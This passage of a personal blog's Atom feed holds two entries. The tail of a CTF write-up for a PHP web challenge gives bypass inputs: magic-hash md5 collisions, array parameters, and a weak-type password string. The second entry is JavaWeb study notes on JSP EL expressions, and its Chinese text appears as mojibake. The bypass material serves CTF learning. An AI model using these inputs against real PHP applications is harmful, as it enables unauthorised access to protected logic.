class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>çœ‹ç¬¬ä¸€ä¸ªifå°±æ˜¯è€ƒè™‘md5ç¢°æ’<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=QNKCDZO&amp;gg=s878926199a</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯å‘ç°ä¸è¡Œï¼Œæ‰€ä»¥ä½¿ç”¨æ•°ç»„<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[]=<span class="number">1</span>&amp;gg[]=<span class="number">2</span></span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥æ˜¯POSTè¯·æ±‚ï¼Œå¼±ç±»å‹æ¯”è¾ƒå¹¶ä¸”è¦æ±‚passwdä¸èƒ½ä¸ºæ•°å­—ï¼Œé‚£å°±åŠ å­—ç¬¦1234567abcï¼Œè¿™å°±å˜æˆå­—ç¬¦ä¸²äº†</p><p><img src="/img/Nepnep/Ez_bypass.png" alt="avatar"></p><p>å¾—åˆ°flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€&quot;&gt;&lt;a href=&quot;#BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€&quot;&gt;&lt;/a&gt;[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€&lt;/h1&gt;&lt;h2 id=
      
    
    </summary>
    
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
      <category term="WEB" scheme="http://yoursite.com/categories/WP/WEB/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Nepnep" scheme="http://yoursite.com/tags/Nepnep/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-2020/8/8-ELè¡¨è¾¾å¼</title>
    <link href="http://yoursite.com/2020/08/08/JavaWeb-2020-8-8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/08/08/JavaWeb-2020-8-8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-08-08T00:29:00.000Z</published>
    <updated>2021-02-21T04:58:08.940Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELè¡¨è¾¾å¼"><a href="#ELè¡¨è¾¾å¼" class="headerlink" title="ELè¡¨è¾¾å¼"></a>ELè¡¨è¾¾å¼</h1><ol><li><p>ELï¼ˆExpression Languageè¡¨è¾¾å¼è¯­è¨€ï¼‰</p></li><li><p>ä½œç”¨ï¼šæ›¿æ¢å’Œç®€åŒ–jspé¡µé¢ä¸­javaä»£ç çš„ç¼–å†™</p></li><li><p>è¯­æ³•ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;è¡¨è¾¾å¼&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>æ³¨æ„ï¼š </p><ul><li><p>jspé»˜è®¤æ”¯æŒelè¡¨è¾¾å¼ï¼Œå¦‚æœè¦å¿½ç•¥ELè¡¨è¾¾å¼</p><ol><li><p>è®¾ç½®JSPä¸­pageæŒ‡ä»¤ä¸­isELIgnored=â€trueâ€å¿½ç•¥å½“å‰JSPé¡µé¢ä¸­æ‰€æœ‰çš„ELè¡¨è¾¾å¼</p></li><li><p>${è¡¨è¾¾å¼} å¿½ç•¥å½“å‰è¿™ä¸ªELè¡¨è¾¾å¼</p></li></ol></li></ul></li><li><p>ä½¿ç”¨ï¼š</p><ol><li><p>è¿ç®—</p><ul><li><p>è¿ç®—ç¬¦</p><ol><li><p>ç®—æœ¯è¿ç®—ç¬¦ï¼š+ - * / %</p></li><li><p>æ¯”è¾ƒè¿ç®—ç¬¦ï¼š&lt; &gt; &lt;= &gt;= == !=</p></li><li><p>é€»è¾‘è¿ç®—ç¬¦ï¼š &amp;&amp; || !</p></li><li><p>ç©ºè¿ç®—ç¬¦ empty</p><ul><li><p>åŠŸèƒ½ï¼šç”¨äºåˆ¤æ–­å­—ç¬¦ä¸²ï¼Œé›†åˆï¼Œæ•°ç»„å¯¹è±¡æ˜¯å¦ä¸ºnullå¹¶ä¸”é•¿åº¦æ˜¯å¦ä¸º0</p></li><li><p>${empty list}</p></li><li><p>${not empty str}ï¼šè¡¨ç¤ºåˆ¤æ–­å­—ç¬¦ä¸²ï¼Œé›†åˆï¼Œæ•°ç»„å¯¹è±¡æ˜¯å¦ä¸ä¸ºnullæˆ–è€…é•¿åº¦&gt;0</p></li></ul></li></ol></li></ul></li><li><p>è·å–å€¼</p></li></ol></li></ol><h2 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h2><p>ç®—æœ¯ï¼š<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">$</span><span class="template-variable">&#123;3+4&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">$</span><span class="template-variable">&#123;3/4&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span>  <span class="tag">&lt;<span class="name">%--$</span></span></span><span class="template-variable">&#123;3 div 4&#125;</span><span class="xml"><span class="tag"><span class="attr">--</span>%&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">$</span><span class="template-variable">&#123;3%4&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span>  <span class="tag">&lt;<span class="name">%--$</span></span></span><span class="template-variable">&#123;3 mod 4&#125;</span><span class="xml"><span class="tag"><span class="attr">--</span>%&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><img src="/img/JavaWeb/8-8å­¦ä¹ æ—¥è®°/0.png" alt="avatar"></p><p>æ¯”è¾ƒï¼šï¼ˆé€»è¾‘ç±»ä¼¼ä¸æ¼”ç¤ºäº†ï¼‰<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="number">3</span>&lt;<span class="number">4</span>&#125;&lt;br&gt;</span><br></pre></td></tr></table></figure><br>è¿”å›true</p><h3 id="emptyè¿ç®—ç¬¦"><a href="#emptyè¿ç®—ç¬¦" class="headerlink" title="emptyè¿ç®—ç¬¦"></a>emptyè¿ç®—ç¬¦</h3><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">empty</span>è¿ç®—ç¬¦</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="built_in">String</span> str1=<span class="string">"abc"</span>;</span><br><span class="line">    <span class="built_in">String</span> str2=<span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">String</span> str3=<span class="string">""</span>;</span><br><span class="line">    <span class="built_in">request</span>.setAttribute(<span class="string">"str1"</span>,str1);</span><br><span class="line">    <span class="built_in">request</span>.setAttribute(<span class="string">"str2"</span>,str2);</span><br><span class="line">    <span class="built_in">request</span>.setAttribute(<span class="string">"str3"</span>,str3);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">$&#123;<span class="literal">empty</span> str1&#125;&lt;br&gt;</span><br><span class="line">$&#123;<span class="literal">empty</span> str2&#125;&lt;br&gt;</span><br><span class="line">$&#123;<span class="literal">empty</span> str3&#125;&lt;br&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥åˆ¤æ–­æ˜¯å¦ä¸ºnullæˆ–é•¿åº¦æ˜¯å¦ä¸ºé›¶<br><img src="/img/JavaWeb/8-8å­¦ä¹ æ—¥è®°/7.png" alt="avatar"></p><p>å¦‚æœè¦å–åæ“ä½œï¼Œé‚£å°±æ˜¯not empty</p><h2 id="è·å–å€¼"><a href="#è·å–å€¼" class="headerlink" title="è·å–å€¼"></a>è·å–å€¼</h2><ol><li><p>ELè¡¨è¾¾å¼åªèƒ½ä»åŸŸå¯¹è±¡ä¸­è·å–å€¼</p></li><li><p>è¯­æ³•ï¼š</p><ol><li><p>${åŸŸåç§°.é”®å}ï¼šä»æŒ‡å®šåŸŸä¸­è·å–æŒ‡å®šé”®çš„å€¼</p><ul><li><p>åŸŸåç§°ï¼š</p><ol><li><p>pageScope â€”&gt; pageContext</p></li><li><p>requestScope â€”&gt; request</p></li><li><p>sessionScope â€”&gt; session</p></li><li><p>applicationScope â€”&gt; application(ServletContext)</p></li></ol></li><li><p>ä¸¾ä¾‹ï¼šåœ¨requeståŸŸä¸­å­˜å‚¨äº†name-å¼ ä¸‰</p></li><li><p>è·å–ï¼š${requestScope.name}</p></li></ul></li><li><p>${é”®å}ï¼šè¡¨ç¤ºä¾æ¬¡ä»æœ€å°çš„åŸŸä¸­æŸ¥æ‰¾æ˜¯å¦æœ‰è¯¥é”®å¯¹åº”çš„å€¼ï¼Œç›´åˆ°æ‰¾åˆ°ä¸ºæ­¢</p></li></ol></li></ol><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//åœ¨åŸŸä¸­å­˜å‚¨æ•°æ®</span></span><br><span class="line">    request.setAttribute(<span class="string">"name"</span>,<span class="string">"zhangsan"</span>);</span><br><span class="line">    session.setAttribute(<span class="string">"age"</span>,<span class="string">"23"</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    è·å–å€¼</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;requestScope</span>.name&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;sessionScope</span>.age&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;sessionScope</span>.name&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„å€¼ï¼Œåˆ™ä¼šè¿”å›ç©ºå­—ç¬¦ä¸²è€Œä¸æ˜¯nullï¼Œè¿™æ ·å°±ä¸ä¼šæ‰“ä¹±å¸ƒå±€<br><img src="/img/JavaWeb/8-8å­¦ä¹ æ—¥è®°/1.png" alt="avatar"></p><h3 id="è·å–å¯¹è±¡å€¼"><a href="#è·å–å¯¹è±¡å€¼" class="headerlink" title="è·å–å¯¹è±¡å€¼"></a>è·å–å¯¹è±¡å€¼</h3><ul><li>å¯¹è±¡ï¼š${åŸŸåç§°.é”®å.å±æ€§å}<ul><li>æœ¬è´¨ä¸Šè°ƒç”¨å¯¹è±¡çš„getteræ–¹æ³•</li></ul></li></ul><p>Userç±»ï¼š<br><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">String</span> name;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">int</span> age;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">Date</span> birthday;</span><br></pre></td></tr></table></figure><br>ä»£ç å¤ªå¤šï¼Œå°±æ­£å¸¸çš„ç”Ÿæˆgetterå’Œsetterå°±è¡Œï¼Œè¿™é‡Œåªåˆ—æˆå‘˜å˜é‡äº†</p><p>Userå¯¹è±¡ï¼š<br><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">User</span> <span class="keyword">user</span>=<span class="built_in">new</span> <span class="keyword">User</span>();</span><br><span class="line">    <span class="keyword">user</span>.setName("å¼ ä¸‰");</span><br><span class="line">    <span class="keyword">user</span>.setAge(<span class="number">23</span>);</span><br><span class="line">    <span class="keyword">user</span>.setBirthday(<span class="built_in">new</span> <span class="type">Date</span>());</span><br><span class="line"></span><br><span class="line">    request.setAttribute("u",<span class="keyword">user</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">elè·å–å¯¹è±¡ä¸­çš„å€¼</span><br><span class="line">$&#123;requestScope.u&#125;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;%<span class="comment">--</span></span><br><span class="line">é€šè¿‡çš„æ˜¯å¯¹è±¡çš„å±æ€§æ¥è·å–</span><br><span class="line">    setteræˆ–getteræ–¹æ³•ï¼Œå»æ‰<span class="keyword">set</span>æˆ–<span class="keyword">get</span>ï¼Œåœ¨å°†å‰©ä½™éƒ¨åˆ†ï¼Œé¦–å­—æ¯å˜å°å†™ã€‚</span><br><span class="line">    setName <span class="comment">--&gt; Name --&gt; name</span></span><br><span class="line"><span class="comment">--%&gt;</span></span><br><span class="line"></span><br><span class="line">$&#123;requestScope.u.name&#125;&lt;br&gt;</span><br><span class="line">$&#123;requestScope.u.age&#125;&lt;br&gt;</span><br><span class="line">$&#123;requestScope.u.birthday&#125;&lt;br&gt;</span><br></pre></td></tr></table></figure><br>è¿è¡Œç»“æœ<br><img src="/img/JavaWeb/8-8å­¦ä¹ æ—¥è®°/2.png" alt="avatar"></p><p>ä¿è¯é”®åç§°ä¸ç›¸åŒï¼Œå¯ä»¥çœç•¥æ‰requestScope</p><p>å¦‚æœæƒ³è¦åªè¾“å‡ºæ—¥æœŸä¸­çš„å¹´æˆ–è€…æœˆä¹‹ç±»çš„ï¼Œç›´æ¥birthday.year<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">$</span><span class="template-variable">&#123;u.birthday.year&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>è¿™æ ·å°±ä¼šè¾“å‡ºå¹´ä»½äº†ï¼Œç»å…¸å¥—å¨ƒ</p><p>å¦‚æœæƒ³è¦ä¸­æ–‡æ ¼å¼çš„ï¼Œåªéœ€è¦åœ¨ç±»ä¸­å£°æ˜ä¸€ä¸ªæ–¹æ³•ï¼Œæ ¼å¼åŒ–å¯¹è±¡ç±»ï¼Œå†è°ƒç”¨å°±OKäº†<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function">String <span class="title">getBitStr</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(birthday!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//1.æ ¼å¼åŒ–æ—¥æœŸå¯¹è±¡</span></span><br><span class="line">            SimpleDateFormat sdf=<span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line">            <span class="comment">//2.è¿”å›å­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="function"><span class="keyword">return</span> sdf.<span class="title">format</span><span class="params">(birthday)</span></span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">" "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>è°ƒç”¨ï¼š<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">$</span><span class="template-variable">&#123;u.bitStr&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>è¿è¡Œç»“æœ<br><img src="/img/JavaWeb/8-8å­¦ä¹ æ—¥è®°/3.png" alt="avatar"></p><h3 id="è·å–Listå€¼"><a href="#è·å–Listå€¼" class="headerlink" title="è·å–Listå€¼"></a>è·å–Listå€¼</h3><ul><li>Listé›†åˆï¼š${åŸŸåç§°.é”®å[ç´¢å¼•]}</li></ul><p>è®¾ç½®List:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List <span class="attribute">list</span>=new ArrayList&lt;&gt;();</span><br><span class="line">list.<span class="builtin-name">add</span>(<span class="string">"aaa"</span>);</span><br><span class="line">list.<span class="builtin-name">add</span>(<span class="string">"bbb"</span>);</span><br></pre></td></tr></table></figure><p>è·å–List:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elè·å–<span class="keyword">List</span>å€¼</span><br><span class="line"><span class="variable">$&#123;list&#125;</span>&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[0]&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[1]&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[5]&#125;&lt;<span class="keyword">br</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/JavaWeb/8-8å­¦ä¹ æ—¥è®°/4.png" alt="avatar"></p><p>è¿™å°±æ˜¯è·å–Listçš„å€¼ï¼Œå¾ˆç®€å•ï¼Œå½“ä¸‹æ ‡è¶Šç•Œæ—¶å¹¶ä¸ä¼šæŠ¥é”™æˆ–è€…è¾“å‡ºnullï¼Œè€Œæ˜¯è¾“å‡ºç©ºå­—ç¬¦ä¸²ï¼ŒåŒæ ·è¿™æ ·çš„ä¼˜åŒ–ä¸ä¼šæ‰“ä¹±å¸ƒå±€</p><p>å¦‚æœæ·»åŠ çš„æ˜¯å¯¹è±¡<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List <span class="attribute">list</span>=new ArrayList&lt;&gt;();</span><br><span class="line">list.<span class="builtin-name">add</span>(<span class="string">"aaa"</span>);</span><br><span class="line">list.<span class="builtin-name">add</span>(<span class="string">"bbb"</span>);</span><br><span class="line">list.<span class="builtin-name">add</span>(user);</span><br></pre></td></tr></table></figure><br>è·å–ä¹Ÿå¾ˆç®€å•<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">elè·å–<span class="keyword">List</span>å€¼</span><br><span class="line"><span class="variable">$&#123;list&#125;</span>&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[0]&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[1]&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[5]&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[2].name&#125;&lt;<span class="keyword">br</span>&gt;</span><br></pre></td></tr></table></figure><br><img src="/img/JavaWeb/8-8å­¦ä¹ æ—¥è®°/5.png" alt="avatar"></p><h3 id="è·å–Listå€¼-1"><a href="#è·å–Listå€¼-1" class="headerlink" title="è·å–Listå€¼"></a>è·å–Listå€¼</h3><ul><li><p>Mapé›†åˆï¼š</p><ul><li><p>${åŸŸåç§°.é”®å.keyåç§°}</p></li><li><p>${åŸŸåç§°.é”®å[â€œkeyåç§°â€]}</p></li></ul></li></ul><p>è®¾ç½®Map:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Map <span class="built_in">map</span>=<span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"sname"</span>,<span class="string">"æå››"</span>);</span><br><span class="line"><span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"gender"</span>,<span class="string">"ç”·"</span>);</span><br><span class="line">request.setAttribute(<span class="string">"map"</span>,<span class="built_in">map</span>);</span><br></pre></td></tr></table></figure><br>è·å–Map:<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;h3&gt;</span><span class="keyword">el</span>è·å–Mapå€¼&lt;/h3&gt;</span><br><span class="line">$&#123;<span class="keyword">map</span>&#125;<span class="symbol">&lt;br&gt;</span></span><br><span class="line">$&#123;<span class="keyword">map</span>.sname&#125;<span class="symbol">&lt;br&gt;</span></span><br><span class="line">$&#123;<span class="keyword">map</span>[<span class="string">"gender"</span>]&#125;<span class="symbol">&lt;br&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/img/JavaWeb/8-8å­¦ä¹ æ—¥è®°/6.png" alt="avatar"></p><p>å¾ˆç®€å•</p><p>æ·»åŠ å¯¹è±¡æ–¹æ³•ä¹Ÿä¸€æ ·ï¼Œå¥—å¨ƒå°±å®Œäº†</p><h2 id="éšå¼å¯¹è±¡"><a href="#éšå¼å¯¹è±¡" class="headerlink" title="éšå¼å¯¹è±¡"></a>éšå¼å¯¹è±¡</h2><ul><li><p>éšå¼å¯¹è±¡æœ‰11ä¸ªï¼Œä½†æ˜¯ç°åœ¨åªéœ€è¦æŒæ¡pageContext</p></li><li><p>pageContextï¼š</p><ul><li>è·å–JSPå…¶ä»–å…«ä¸ªå†…ç½®å¯¹è±¡<ul><li>${pageContext.request.contextPath}ï¼šåŠ¨æ€è·å–è™šæ‹Ÿç›®å½•</li></ul></li></ul></li></ul><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">$</span><span class="template-variable">&#123;pageContext.request&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>åŠ¨æ€è·å–è™šæ‹Ÿç›®å½•<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">$</span><span class="template-variable">&#123;pageContext.request.contextPath&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/img/JavaWeb/8-8å­¦ä¹ æ—¥è®°/8.png" alt="avatar"></p><p>è¿™ä¸ªçš„ç”¨é€”å°±æ˜¯åœ¨è¡¨å•actionä¸­ï¼ŒæŠŠè™šæ‹Ÿç›®å½•å˜ä¸ºåŠ¨æ€æ”¹å˜çš„ï¼Œè€Œä¸æ˜¯å†™æ­»çš„é™æ€çš„</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ELè¡¨è¾¾å¼&quot;&gt;&lt;a href=&quot;#ELè¡¨è¾¾å¼&quot; class=&quot;headerlink&quot; title=&quot;ELè¡¨è¾¾å¼&quot;&gt;&lt;/a&gt;ELè¡¨è¾¾å¼&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;ELï¼ˆExpression Languageè¡¨è¾¾å¼è¯­è¨€ï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ä½œç”¨ï¼š
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
</feed>
